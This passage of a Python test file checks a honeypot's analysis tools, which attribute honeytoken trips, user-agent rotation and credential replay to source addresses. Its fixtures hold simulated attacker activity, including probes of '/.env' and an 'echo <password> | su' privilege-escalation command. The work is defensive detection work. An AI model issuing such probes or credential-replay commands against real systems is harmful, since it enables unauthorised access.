    assert tail["share_of_sources_pct"] == round(100 * 10 / 13, 2)
    assert out["size_bands"]["1-10"] == {"sources": 10, "events": 19}
    assert out["size_bands"]["11-100"] == {"sources": 3, "events": 91}
    daily = {d["date"]: d for d in out["daily"]}
    assert daily["2026-09-01"] == {"date": "2026-09-01", "events": 59, "distinct_sources": 10}
    assert daily["2026-09-02"] == {"date": "2026-09-02", "events": 51, "distinct_sources": 3}
    assert out["scan"]["complete"] is True

    sip = await _call("concentration", service="sip", top=1)
    assert sip["total_events"] == 80 and sip["total_sources"] == 2
    assert sip["top_sources"][0]["share_pct"] == 62.5


async def test_concentration_window_follows_the_hourly_rollup_buckets():
    now = _now()
    await _seed(
        [
            ("ssh_session_connect", "192.0.2.1", {}, now - timedelta(hours=48)),
            ("ssh_session_connect", "192.0.2.2", {}, now - timedelta(minutes=5)),
        ]
    )

    out = await _call("concentration", since_hours=6)

    assert out["total_events"] == 1 and out["top_sources"][0]["source_ip"] == "192.0.2.2"
    assert "partial hour" in out["basis"]


# ── bait_trips ────────────────────────────────────────────────────────────────


async def _call_bait(**kwargs: Any) -> dict[str, Any]:
    from honeypot_mcp.tools.patterns import bait_trips

    return await bait_trips(**kwargs)


async def test_bait_trips_chronology_for_the_read_then_replay_chain():
    trip_at = _now() - timedelta(hours=1)
    created = trip_at - timedelta(minutes=30)
    tid = await _token(label="public-bait", created_at=created)
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = [
        # well before the token existed
        ("http_probe", "192.0.2.10", _http("/", "Mozilla/5.0"), trip_at - timedelta(hours=3)),
        # the decoy read, 9 minutes before the trip, then another agent, then the pair replayed on ftp
        (
            "http_decoy_served",
            "192.0.2.10",
            _http("/.env", "curl/8.4", decoy_target="/.env"),
            trip_at - timedelta(seconds=540),
        ),
        (
            "http_probe",
            "192.0.2.10",
            _http("/admin", "python-requests/2.31"),
            trip_at - timedelta(seconds=500),
        ),
        (
            "ssh_command_input",
            "192.0.2.10",
            {"input": f"echo {PLANTED_PASSWORD} | su"},
            trip_at - timedelta(seconds=300),
        ),
        (
            "ftp_login_attempt",
            "192.0.2.10",
            {"username": PLANTED_USER, "password": "wrong"},
            trip_at - timedelta(seconds=20),
        ),
        ("ssh_session_connect", "192.0.2.10", {"session": "z"}, trip_at - timedelta(seconds=1)),
        (
            "honeytoken_triggered_credential_via_ssh_login_success",
            "192.0.2.10",
            _login(PLANTED_USER, PLANTED_PASSWORD),
            trip_at,
        ),
        (
            "honeytoken_triggered_credential_via_ssh_login_success",
            "192.0.2.10",
            _login(PLANTED_USER, PLANTED_PASSWORD),
            trip_at + timedelta(minutes=10),
        ),
        # a second source that arrives out of nowhere, already holding the pair
        (
            "ssh_session_connect",
            "198.51.100.20",
            {"session": "q"},
            trip_at + timedelta(minutes=5) - timedelta(seconds=1),
        ),
        (
            "honeytoken_triggered_credential_via_ssh_login_success",
            "198.51.100.20",
            _login(PLANTED_USER, PLANTED_PASSWORD),
            trip_at + timedelta(minutes=5),
        ),
    ]
    await _seed(rows)

    out = await _call_bait()
    blob = json.dumps(out)

    assert PLANTED_PASSWORD not in blob, "the planted secret must never be returned"
    assert out["count"] == 1 and out["trips_total"] == 3
    token = out["tokens"][0]
    assert (token["token_id"], token["label"], token["type"], token["service"]) == (
        tid,
        "public-bait",
        "credential",
        "ssh",
    )
    assert token["created_at"] == created.replace(microsecond=0).isoformat() or token[
        "created_at"
    ].startswith(created.isoformat()[:19])
    assert token["delay_to_first_trip_seconds"] == pytest.approx(1800, abs=1)
    assert token["sources_total"] == 2
    reader, arrival = token["sources"]  # most active first
    assert reader["source_ip"] == "192.0.2.10" and reader["trips"] == 2

    assert reader["earlier_contact"] is True and reader["contact_before_token_created"] is True
    assert reader["bait_file_fetched_before_trip"] is True
    fetch = reader["decoy_fetches_before_trip"][0]
    assert fetch["target"] == "/.env" and fetch["seconds_before_trip"] == pytest.approx(
        540, abs=0.01
    )
    assert fetch["before_token_was_created"] is False
    assert reader["lead_up"]["user_agent_rotation"] is True
    assert set(reader["lead_up"]["user_agents"]) == {
        "Mozilla/5.0",
        "curl/8.4",
        "python-requests/2.31",
    }
    assert any("[masked: planted honeytoken #" in c for c in reader["lead_up"]["commands"])
    assert (
        set(reader["pair_seen_on_services"]) == {"ssh", "ftp"}
        and reader["replayed_on_other_services"] is True
    )
    chronology = reader["lead_up"]["chronology"]
    assert chronology[-1]["event_type"] == "ssh_session_connect"
    assert [r["seconds_before_trip"] for r in chronology] == sorted(
        (r["seconds_before_trip"] for r in chronology), reverse=True
    )
    assert "read-the-bait" in reader["verdict"]
    assert reader["trip_event_types"] == {
        "honeytoken_triggered_credential_via_ssh_login_success": 2
    }

    # No earlier contact at all: its only prior event is the tripping session's own connection.
    assert arrival["source_ip"] == "198.51.100.20"
    assert arrival["earlier_contact"] is False
    assert (
        arrival["bait_file_fetched_before_trip"] is False
        and arrival["decoy_fetches_before_trip"] == []
    )
    assert arrival["seconds_from_first_contact_to_first_trip"] == pytest.approx(1, abs=0.01)
    assert "already holding the credential" in arrival["verdict"]
    assert arrival["replayed_on_other_services"] is False


async def test_bait_trips_exclude_sources_since_and_unknown_tokens():
    trip_at = _now() - timedelta(minutes=10)
    tid = await _token(created_at=trip_at - timedelta(hours=1))
    quiet = await _token(
        label="never-fired",
        value="other",
        meta={"credentials": [{"username": "zz_user", "password": "ZzPlanted12345"}]},
    )
    await _seed(
        [
            (
                "honeytoken_triggered_credential_via_ssh_login_success",
                "127.0.0.1",
                _login(PLANTED_USER, PLANTED_PASSWORD),
                trip_at,
            ),
            (
                "honeytoken_triggered_credential_via_ssh_login_success",
                "192.0.2.77",
                _login(PLANTED_USER, PLANTED_PASSWORD),
                trip_at + timedelta(minutes=1),
            ),
        ]
    )

    everyone = await _call_bait()
    assert {s["source_ip"] for s in everyone["tokens"][0]["sources"]} == {"127.0.0.1", "192.0.2.77"}
    loopback = next(s for s in everyone["tokens"][0]["sources"] if s["source_ip"] == "127.0.0.1")
    assert loopback["public_address"] is False and loopback["first_seen_overall"]

    trimmed = await _call_bait(exclude_sources=["127.0.0.1"])
    assert [s["source_ip"] for s in trimmed["tokens"][0]["sources"]] == ["192.0.2.77"]
    assert trimmed["excluded_trips"] == 1 and trimmed["excluded_sources"] == ["127.0.0.1"]

    assert (await _call_bait(since_hours=0.1))["count"] == 0
    assert (await _call_bait(since_hours=1))["count"] == 1

    # An id names a token even when it never fired; an unknown id is an error, not "no trips".
    asked = await _call_bait(token_id=quiet)
    assert (
        asked["count"] == 1
        and asked["tokens"][0]["trips"] == 0
        and asked["tokens"][0]["sources"] == []
    )
    assert "No honeytoken" in (await _call_bait(token_id=99999))["error"]
    assert "not a valid" in (await _call_bait(exclude_sources=["nonsense"]))["error"]
    assert "lookback_hours" in (await _call_bait(lookback_hours=0))["error"]
    only = await _call_bait(token_id=tid)
    assert only["tokens"][0]["trips"] == 2


async def test_bait_trips_link_canary_and_history_only_trips_and_report_the_rest():
    created = _now() - timedelta(hours=2)
    canary = await _token(
        label="canary",
        type_="canary_url",
        created_at=created,
        value="canary-1",
        meta={"token_uid": "abc"},
    )
    history_token = await _token(
        label="hist",
        value="hist-1",
        meta={
            "credentials": [],  # no username to match on: only the recorded trigger history links it
            "triggers": [
                {
                    "at": (_now() - timedelta(minutes=30)).isoformat(),
                    "trigger_ip": "192.0.2.31",
                    "trigger_event_type": "honeytoken_triggered_jwt_via_http_probe",
                },
            ],
        },
        created_at=created,
    )
    await _seed(
        [
            (
                "honeytoken_triggered_canary_url",
                "203.0.113.7",
                {
                    "token_id": canary,
                    "token_label": "canary",
                    "user_agent": "curl/8.7.1",
                    "path": "/t/x",
                },
                _now() - timedelta(hours=1),
            ),
            (
                "honeytoken_triggered_jwt_via_http_probe",
                "192.0.2.31",
                {"path": "/"},
                _now() - timedelta(minutes=30),
            ),
            # trips that match nothing are reported, not dropped
            (
                "honeytoken_triggered_ssh_key_via_ssh_pubkey_attempt",
                "192.0.2.32",
                {"fingerprint": "ab"},
                _now() - timedelta(minutes=20),
            ),
        ]
    )

    out = await _call_bait()

    by_id = {t["token_id"]: t for t in out["tokens"]}
    assert by_id[canary]["sources"][0]["source_ip"] == "203.0.113.7"
    assert by_id[canary]["delay_to_first_trip_seconds"] == pytest.approx(3600, abs=2)
    assert by_id[history_token]["sources"][0]["source_ip"] == "192.0.2.31"
    assert out["unattributed_trips"] == {"honeytoken_triggered_ssh_key_via_ssh_pubkey_attempt": 1}
    assert "could not be tied" in out["note"]
